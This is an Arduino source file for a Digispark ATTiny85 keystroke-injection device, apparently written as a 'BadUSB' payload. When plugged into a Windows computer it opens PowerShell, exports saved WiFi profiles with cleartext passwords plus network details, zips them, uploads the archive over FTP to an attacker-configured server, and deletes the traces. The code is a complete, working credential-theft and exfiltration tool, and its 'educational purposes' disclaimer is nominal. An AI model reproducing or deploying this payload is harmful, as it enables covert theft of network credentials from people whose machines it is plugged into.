/*
  Windows FTP Steal WiFi Credentials

  This payload for Windows creates a tmp folder in the user's 
  directory, exports WiFi profiles with clear passwords, 
  along with some useful info, then opens an FTP connection to
  upload all the data and deletes the folder at the end.

  created 27 july 2024
  by C.E. alias c0rgo

  WARNING: this script requires Digispark ATTiny85.
  Be sure to have the required board or you will get an error.

  DISCLAIMER: this code is for educational purposes only.
  Do not attempt to violate the law, any misuse of this script
  can result in criminal charges.
  I will not be responsible for any of your illegal actions.
  You may however try it out on your computer at your own risk.
*/

// #define LAYOUT_HERE
#include "DigiKeyboard.h"

// Device initialization
void setup() {
  DigiKeyboard.update();
  // Mantatory delay before launching payload
  DigiKeyboard.delay(3000);
}

void loop() {
  // Press WIN + R = Execute dialog
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);

  // Launch PowerShell
  // .println also presses ENTER after the string
  DigiKeyboard.print(F("powershell.exe"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(5000);


  // I noticed that .println results in the ENTER keystroke
  // being sent two times, this of course is a problem
  // when data needs to be entered ad a precise time,
  // the workaround was using .print and manually send ENTER
  DigiKeyboard.print(F("mkdir tmp"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  DigiKeyboard.print(F("ipconfig /all > ./tmp/ip_info.txt"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  DigiKeyboard.print(F("netsh wlan export profile folder=.\\tmp key=clear"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(4500);
  DigiKeyboard.print(F("Compress-Archive -Path ./tmp -DestinationPath ./tmp/tmp_archive.zip"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(5000);
  DigiKeyboard.print(F("ftp -i"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  // Put here your FTP server ADDRESS
  DigiKeyboard.print(F("open 192.168.1.1"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  // Put here your FTP server USER
  DigiKeyboard.print(F("ftpuser"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  // Put here your FTP server PASSWORD
  DigiKeyboard.print(F("ftppass"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  DigiKeyboard.print(F("put ./tmp/tmp_archive.zip"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(6500);
  DigiKeyboard.print(F("bye"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  DigiKeyboard.print(F("del -r tmp"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);
  DigiKeyboard.print(F("exit"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);

  // End of payload
  // Prevent loop relaunch
  while (1);
}
